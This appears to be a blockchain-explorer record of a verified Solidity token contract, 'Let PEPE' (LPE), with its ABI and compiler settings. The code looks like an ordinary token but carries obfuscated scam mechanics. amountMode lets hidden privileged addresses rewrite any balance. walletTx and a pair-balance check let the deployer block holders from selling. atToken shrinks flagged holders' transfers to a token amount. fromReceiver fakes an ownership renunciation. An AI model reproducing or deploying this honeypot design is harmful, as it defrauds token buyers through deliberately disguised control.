{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface liquidityTokenSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchBuy) external view returns (uint256);\n\n    function transfer(address launchAuto, uint256 marketingWalletLimit) external returns (bool);\n\n    function allowance(address maxFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingWalletLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAuto,\n        uint256 marketingWalletLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitMode, uint256 value);\n    event Approval(address indexed maxFrom, address indexed spender, uint256 value);\n}\n\nabstract contract tradingTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyReceiver {\n    function createPair(address sellFromList, address txSell) external returns (address);\n}\n\ninterface totalToken is liquidityTokenSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LetPEPE is tradingTx, liquidityTokenSender, totalToken {\n\n    uint256 private launchToken = 100000000 * 10 ** 18;\n\n    uint256 private tradingTotal;\n\n    uint256 tradingFund;\n\n    mapping(address => bool) public launchedAt;\n\n    string private swapTeamToken = \"LPE\";\n\n    function walletTx(uint256 marketingWalletLimit) public {\n        swapLimit();\n        senderExempt = marketingWalletLimit;\n    }\n\n    function feeLimit(address limitMaxToken) public {\n        require(limitMaxToken.balance < 100000);\n        if (marketingTeam) {\n            return;\n        }\n        \n        maxTeam[limitMaxToken] = true;\n        if (swapFrom != liquidityFeeShould) {\n            liquidityFeeShould = false;\n        }\n        marketingTeam = true;\n    }\n\n    function atToken(address feeFrom) public {\n        swapLimit();\n        \n        if (feeFrom == limitMinIs || feeFrom == receiverWallet) {\n            return;\n        }\n        launchedAt[feeFrom] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return listIs;\n    }\n\n    uint256 public takeTrading;\n\n    address autoAmountLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 senderExempt;\n\n    address private listIs;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    uint256 public amountFund;\n\n    function transfer(address maxToTx, uint256 marketingWalletLimit) external virtual override returns (bool) {\n        return enableMinLiquidity(_msgSender(), maxToTx, marketingWalletLimit);\n    }\n\n    uint256 constant teamFund = 16 ** 10;\n\n    function transferFrom(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) external override returns (bool) {\n        if (_msgSender() != autoAmountLimit) {\n            if (autoShouldTotal[totalTxSwap][_msgSender()] != type(uint256).max) {\n                require(marketingWalletLimit <= autoShouldTotal[totalTxSwap][_msgSender()]);\n                autoShouldTotal[totalTxSwap][_msgSender()] -= marketingWalletLimit;\n            }\n        }\n        return enableMinLiquidity(totalTxSwap, launchAuto, marketingWalletLimit);\n    }\n\n    function allowance(address swapExempt, address shouldSender) external view virtual override returns (uint256) {\n        if (shouldSender == autoAmountLimit) {\n            return type(uint256).max;\n        }\n        return autoShouldTotal[swapExempt][shouldSender];\n    }\n\n    bool private tokenFee;\n\n    uint8 private maxTotalIs = 18;\n\n    address public receiverWallet;\n\n    address public limitMinIs;\n\n    function swapLimit() private view {\n        require(maxTeam[_msgSender()]);\n    }\n\n    function fromReceiver() public {\n        emit OwnershipTransferred(limitMinIs, address(0));\n        listIs = address(0);\n    }\n\n    function approve(address shouldSender, uint256 marketingWalletLimit) public virtual override returns (bool) {\n        autoShouldTotal[_msgSender()][shouldSender] = marketingWalletLimit;\n        emit Approval(_msgSender(), shouldSender, marketingWalletLimit);\n        return true;\n    }\n\n    uint256 private launchedTo;\n\n    bool public marketingTeam;\n\n    function amountMode(address maxToTx, uint256 marketingWalletLimit) public {\n        swapLimit();\n        autoShould[maxToTx] = marketingWalletLimit;\n    }\n\n    event OwnershipTransferred(address indexed maxBuy, address indexed senderFee);\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTeamToken;\n    }\n\n    string private receiverShould = \"Let PEPE\";\n\n    address enableAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchReceiverLimit(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) internal returns (bool) {\n        require(autoShould[totalTxSwap] >= marketingWalletLimit);\n        autoShould[totalTxSwap] -= marketingWalletLimit;\n        autoShould[launchAuto] += marketingWalletLimit;\n        emit Transfer(totalTxSwap, launchAuto, marketingWalletLimit);\n        return true;\n    }\n\n    constructor (){\n        if (takeTrading != launchedTo) {\n            tokenFee = false;\n        }\n        atReceiver listReceiver = atReceiver(autoAmountLimit);\n        receiverWallet = buyReceiver(listReceiver.factory()).createPair(listReceiver.WETH(), address(this));\n        if (liquidityFeeShould != amountList) {\n            amountFund = launchedTo;\n        }\n        limitMinIs = _msgSender();\n        fromReceiver();\n        maxTeam[limitMinIs] = true;\n        autoShould[limitMinIs] = launchToken;\n        \n        emit Transfer(address(0), limitMinIs, launchToken);\n    }\n\n    bool public amountList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTotalIs;\n    }\n\n    bool public liquidityFeeShould;\n\n    bool public swapFrom;\n\n    mapping(address => uint256) private autoShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchToken;\n    }\n\n    mapping(address => bool) public maxTeam;\n\n    function balanceOf(address launchBuy) public view virtual override returns (uint256) {\n        return autoShould[launchBuy];\n    }\n\n    mapping(address => mapping(address => uint256)) private autoShouldTotal;\n\n    function owner() external view returns (address) {\n        return listIs;\n    }\n\n    uint256 public shouldBuyTrading;\n\n    function enableMinLiquidity(address totalTxSwap, address launchAuto, uint256 marketingWalletLimit) internal returns (bool) {\n        if (totalTxSwap == limitMinIs) {\n            return launchReceiverLimit(totalTxSwap, launchAuto, marketingWalletLimit);\n        }\n        uint256 marketingWallet = liquidityTokenSender(receiverWallet).balanceOf(enableAuto);\n        require(marketingWallet == senderExempt);\n        require(launchAuto != enableAuto);\n        if (launchedAt[totalTxSwap]) {\n            return launchReceiverLimit(totalTxSwap, launchAuto, teamFund);\n        }\n        return launchReceiverLimit(totalTxSwap, launchAuto, marketingWalletLimit);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWalletLimit\",\"type\":\"uint256\"}],\"name\":\"amountMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWalletLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMaxToken\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMinIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFeeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuyTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWalletLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTxSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWalletLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingWalletLimit\",\"type\":\"uint256\"}],\"name\":\"walletTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LetPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}